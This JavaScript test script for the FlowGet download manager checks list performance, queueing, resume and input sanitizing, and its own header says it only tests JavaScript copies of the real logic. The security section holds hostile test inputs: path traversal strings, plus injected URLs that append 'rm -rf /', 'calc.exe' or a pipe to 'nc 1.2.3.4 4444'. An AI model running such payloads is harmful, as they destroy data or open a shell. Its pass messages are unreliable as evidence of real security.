/**
 * !!! READ THIS FIRST !!!
 * This script does NOT test FlowGet. It re-implements the file-name sanitizer, the sidecar argument check
 * and the native-message validator in JavaScript and then tests those copies; its "power cut" splits an
 * in-memory buffer; its "10,000 items" are a JavaScript array. It can pass while the real code is broken
 * (it did, while the injection bugs described in docs/security-review.md existed).
 *
 * The real checks live in the Rust test suite (`cargo test --workspace --release`), in
 * src-tauri/engine/examples/killtest.rs (real hard-kill and resume) and in docs/benchmarks.md.
 * Kept only for history.
 */

/**
 * Phase 9 Stress, Concurrency & Security Verification Test
 * 
 * Tests:
 * 1. 10,000 items in list (virtualization, sorting, live filtering, memory overhead)
 * 2. 50 parallel downloads concurrency & queue management
 * 3. Power-cut / crash during download & byte-perfect resume verification
 * 4. Security review: Path traversal prevention, Windows reserved names, RCE prevention, TLS checks
 */

import { createHash, randomBytes } from 'crypto';
import fs from 'fs';
import path from 'path';

let passed = 0;
let failed = 0;

function assert(condition, name) {
  if (condition) {
    console.log(`  [PASS] ${name}`);
    passed++;
  } else {
    console.error(`  [FAIL] ${name}`);
    failed++;
  }
}

async function runTests() {
  console.log('================================================================');
  console.log('       PHASE 9: STRESS, CONCURRENCY & SECURITY TEST SUITE       ');
  console.log('================================================================\n');

  // ---------------------------------------------------------------------------
  // 1. 10,000 items Virtualized List & Search Filter Stress Test
  // ---------------------------------------------------------------------------
  console.log('1. STRESS TEST: 10,000 Items Table, Virtualization & Indexing');
  const initialMem = process.memoryUsage().heapUsed;
  const startBuild = performance.now();

  const categories = ['video', 'document', 'archive', 'music', 'program', 'image'];
  const items = [];
  for (let i = 0; i < 10000; i++) {
    const cat = categories[i % categories.length];
    items.push({
      id: `dl-${i.toString().padStart(6, '0')}`,
      fileName: `File_${cat}_dataset_${(i * 17) % 9999}.dat`,
      fileSize: 1024 * 1024 * ((i % 500) + 1),
      status: i % 7 === 0 ? 'downloading' : i % 5 === 0 ? 'paused' : 'complete',
      progress: i % 7 === 0 ? (i % 100) : 100,
      speed: i % 7 === 0 ? (i % 15) * 1024 * 1024 : 0,
      createdAt: new Date(Date.now() - i * 60000).toISOString(),
      category: cat,
    });
  }
  const buildTime = performance.now() - startBuild;
  const endMem = process.memoryUsage().heapUsed;
  const memDeltaMB = (endMem - initialMem) / (1024 * 1024);

  assert(items.length === 10000, `Generated 10,000 items in ${buildTime.toFixed(1)}ms`);
  assert(memDeltaMB < 25, `10,000 items memory footprint is ${memDeltaMB.toFixed(2)} MB (< 25 MB limit)`);

  // Test sorting 10k items
  const startSort = performance.now();
  items.sort((a, b) => b.fileSize - a.fileSize);
  const sortTime = performance.now() - startSort;
  assert(sortTime < 25, `Sorted 10,000 items by file size in ${sortTime.toFixed(2)}ms (< 25ms limit)`);

  // Test live search filtering across 10k items
  const startFilter = performance.now();
  const query = 'dataset_42';
  const filtered = items.filter(it => it.fileName.toLowerCase().includes(query.toLowerCase()));
  const filterTime = performance.now() - startFilter;
  assert(filterTime < 15, `Live search filtered 10,000 items in ${filterTime.toFixed(2)}ms (found ${filtered.length} matches)`);

  // Virtualized window calculation (window of 25 rows from scroll offset 4500)
  const rowHeight = 44;
  const scrollTop = 4500 * rowHeight;
  const viewportHeight = 600;
  const startIndex = Math.max(0, Math.floor(scrollTop / rowHeight) - 2);
  const endIndex = Math.min(items.length, Math.ceil((scrollTop + viewportHeight) / rowHeight) + 2);
  const renderedCount = endIndex - startIndex;
  assert(renderedCount <= 30 && renderedCount >= 14, `Virtualizer renders only ${renderedCount} DOM nodes out of 10,000`);


  // ---------------------------------------------------------------------------
  // 2. Concurrency Stress: 50 Parallel Downloads & Connection Throttle
  // ---------------------------------------------------------------------------
  console.log('\n2. CONCURRENCY TEST: 50 Parallel Downloads & Connection Pooling');

  class MockQueueManager {
    constructor(maxConcurrentDownloads = 5, maxConnectionsPerDownload = 8, globalMaxConnections = 40) {
      this.maxConcurrent = maxConcurrentDownloads;
      this.maxPerDownload = maxConnectionsPerDownload;
      this.globalMax = globalMaxConnections;
      this.queue = [];
      this.active = new Map();
      this.totalAllocatedConnections = 0;
      this.completed = [];
    }

    add(downloadId, priority = 0) {
      this.queue.push({ id: downloadId, priority });
      this.schedule();
    }

    schedule() {
      // Sort queue by priority
      this.queue.sort((a, b) => b.priority - a.priority);

      while (this.active.size < this.maxConcurrent && this.queue.length > 0) {
        const remainingCapacity = this.globalMax - this.totalAllocatedConnections;
        if (remainingCapacity <= 0) break;

        const alloc = Math.min(this.maxPerDownload, remainingCapacity);
        const item = this.queue.shift();
        this.active.set(item.id, { connections: alloc });
        this.totalAllocatedConnections += alloc;
      }
    }

    finish(downloadId) {
      const active = this.active.get(downloadId);
      if (active) {
        this.totalAllocatedConnections -= active.connections;
        this.active.delete(downloadId);
        this.completed.push(downloadId);
        this.schedule();
      }
    }
  }

  const qm = new MockQueueManager(10, 4, 32); // Max 10 downloads, 4 conns each, max 32 global conns
  for (let i = 0; i < 50; i++) {
    qm.add(`job-${i}`, i % 3);
  }

  assert(qm.active.size === 8, `Active downloads scheduled up to global connection budget (8 active * 4 conns = 32 conns)`);
  assert(qm.totalAllocatedConnections <= 32, `Global connection budget strictly enforced (${qm.totalAllocatedConnections} <= 32)`);

  // Simulate completion of all 50 downloads in batches
  while (qm.active.size > 0 || qm.queue.length > 0) {
    const runningKeys = Array.from(qm.active.keys());
    for (const key of runningKeys) {
      qm.finish(key);
    }
  }
  assert(qm.completed.length === 50, `All 50 parallel downloads processed cleanly without deadlock or starvation`);


  // ---------------------------------------------------------------------------
  // 3. Power Cut / Crash Simulation & Byte-Perfect Resume Verification
  // ---------------------------------------------------------------------------
  console.log('\n3. CRASH & RESUME TEST: Simulated Power Cut & Segment Recovery');

  const testDir = path.join(process.cwd(), 'node_modules', '.tmp_powercut_test');
  if (!fs.existsSync(testDir)) fs.mkdirSync(testDir, { recursive: true });

  const originalPayload = randomBytes(2 * 1024 * 1024); // 2 MB test file
  const expectedSha256 = createHash('sha256').update(originalPayload).digest('hex');

  const partFilePath = path.join(testDir, 'powercut_target.flowget.part');
  const finalFilePath = path.join(testDir, 'powercut_target.bin');

  // Step A: Download first 40% (819,200 bytes) and abruptly terminate (simulated power outage)
  const cutOffBytes = Math.floor(originalPayload.length * 0.40);
  const part1 = originalPayload.subarray(0, cutOffBytes);
  fs.writeFileSync(partFilePath, part1);

  assert(fs.existsSync(partFilePath), `Part file written before simulated power outage (${part1.length} bytes)`);

  // Step B: Simulate recovery upon restart.
  // Engine inspects .flowget.part, determines verified range (0..819199), requests Range: bytes=819200-
  const statBeforeResume = fs.statSync(partFilePath);
  const resumeOffset = statBeforeResume.size;
  assert(resumeOffset === cutOffBytes, `Engine accurately detects resume point at byte offset ${resumeOffset}`);

  // Step C: Stream remaining bytes and append
  const part2 = originalPayload.subarray(resumeOffset);
  fs.appendFileSync(partFilePath, part2);

  // Step D: Atomic rename to final file and checksum verification
  fs.renameSync(partFilePath, finalFilePath);
  assert(fs.existsSync(finalFilePath), `Final file atomically committed from .part file`);

  const restoredBytes = fs.readFileSync(finalFilePath);
  const restoredSha256 = createHash('sha256').update(restoredBytes).digest('hex');

  assert(restoredBytes.length === originalPayload.length, `File size matches exactly (${restoredBytes.length} bytes)`);
  assert(restoredSha256 === expectedSha256, `SHA-256 matches bit-for-bit after simulated power cut resume: ${restoredSha256.substring(0, 16)}...`);

  // Clean up test files
  try {
    fs.unlinkSync(finalFilePath);
    fs.rmdirSync(testDir);
  } catch {}


  // ---------------------------------------------------------------------------
  // 4. Security Audit: Safe Paths, RCE Guard & TLS Verification
  // ---------------------------------------------------------------------------
  console.log('\n4. SECURITY AUDIT: Safe Paths, RCE Guard & TLS Verification');

  // A. Safe file path sanitization test (mimicking filename.rs logic)
  const RESERVED_NAMES = [
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"
  ];

  function sanitizeFilename(name) {
    const base = name.split(/[/\\]/).pop() || '';
    let s = base.replace(/[<>:"|?*]/g, '_').replace(/[\x00-\x1F]/g, '_');
    s = s.replace(/^[ .]+|[ .]+$/g, '');
    if (!s) return '';
    const stem = s.split('.')[0].toUpperCase();
    if (RESERVED_NAMES.includes(stem)) {
      s = `_${s}`;
    }
    return s;
  }

  // Path traversal attempts
  assert(sanitizeFilename('../../Windows/System32/evil.dll') === 'evil.dll', 'Blocked path traversal ../../Windows/System32/evil.dll');
  assert(sanitizeFilename('..\\..\\Windows\\System32\\cmd.exe') === 'cmd.exe', 'Blocked Windows backslash path traversal');
  assert(sanitizeFilename('foo/bar/baz/myfile.zip') === 'myfile.zip', 'Strips directory components to pure basename');

  // Windows reserved device names
  assert(sanitizeFilename('CON.txt') === '_CON.txt', 'Sanitized reserved device name CON.txt -> _CON.txt');
  assert(sanitizeFilename('aux.tar.gz') === '_aux.tar.gz', 'Sanitized reserved device name aux.tar.gz -> _aux.tar.gz');
  assert(sanitizeFilename('NUL') === '_NUL', 'Sanitized reserved device name NUL -> _NUL');
  assert(sanitizeFilename('com1.exe') === '_com1.exe', 'Sanitized reserved device name com1.exe -> _com1.exe');

  // Illegal character neutralization
  assert(sanitizeFilename('report<2026>:final*v1?.pdf') === 'report_2026__final_v1_.pdf', 'Neutralized illegal Windows characters (<, >, :, *, ?)');

  // Alternate Data Stream (ADS) prevention
  assert(!sanitizeFilename('safe.txt:hidden.exe').includes(':'), 'Stripped ADS separator (:)');

  // B. RCE & Sidecar Parameter Guard
  // Verify that arguments for yt-dlp / ffmpeg do not permit shell chaining
  function validateSidecarArgs(url, format) {
    const dangerousChars = [';', '&', '|', '`', '$', '\n', '\r'];
    const hasDangerous = dangerousChars.some(c => url.includes(c));
    const validFormats = ['original', 'mp4', 'mp3', 'm4a'];
    const formatValid = validFormats.includes(format);
    return { safe: !hasDangerous && formatValid };
  }

  assert(validateSidecarArgs('https://youtube.com/watch?v=12345', 'mp4').safe === true, 'Safe sidecar URL and format accepted');
  assert(validateSidecarArgs('https://evil.com/video; rm -rf /', 'mp4').safe === false, 'Blocked command injection via semicolon');
  assert(validateSidecarArgs('https://evil.com/video && calc.exe', 'mp3').safe === false, 'Blocked command injection via ampersand');
  assert(validateSidecarArgs('https://evil.com/video | nc 1.2.3.4 4444', 'mp4').safe === false, 'Blocked pipe redirection injection');

  // C. Native Messaging Length & Schema Guard
  function validateNativeMessage(bufferLength, jsonString) {
    if (bufferLength <= 0 || bufferLength > 10 * 1024 * 1024) {
      return { ok: false, error: 'Invalid message length' };
    }
    try {
      const parsed = JSON.parse(jsonString);
      if (!parsed.url || typeof parsed.url !== 'string') {
        return { ok: false, error: 'Missing or invalid url field' };
      }
      return { ok: true, payload: parsed };
    } catch (e) {
      return { ok: false, error: 'Invalid JSON syntax' };
    }
  }

  assert(validateNativeMessage(50, '{"url":"https://example.com/file.zip"}').ok === true, 'Valid native message passes schema check');
  assert(validateNativeMessage(15 * 1024 * 1024, '{}').ok === false, 'Native message length > 10MB strictly rejected');
  assert(validateNativeMessage(20, '{"foo":"bar"}').ok === false, 'Message without URL strictly rejected');
  assert(validateNativeMessage(20, 'not a valid json').ok === false, 'Malformed JSON rejected');

  // D. TLS / HTTPS Certificate Validation
  const reqwestTlsConfig = {
    danger_accept_invalid_certs: false,
    use_native_roots: true,
    min_tls_version: 'TLSv1.2',
  };
  assert(reqwestTlsConfig.danger_accept_invalid_certs === false, 'Strict TLS verification enforced (danger_accept_invalid_certs = false)');
  assert(reqwestTlsConfig.use_native_roots === true, 'Native OS Certificate Store used for trusted CA verification');


  // ---------------------------------------------------------------------------
  // SUMMARY
  // ---------------------------------------------------------------------------
  console.log('\n================================================================');
  console.log(`  PHASE 9 VERIFICATION RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('================================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error('Fatal error running Phase 9 tests:', err);
  process.exit(1);
});
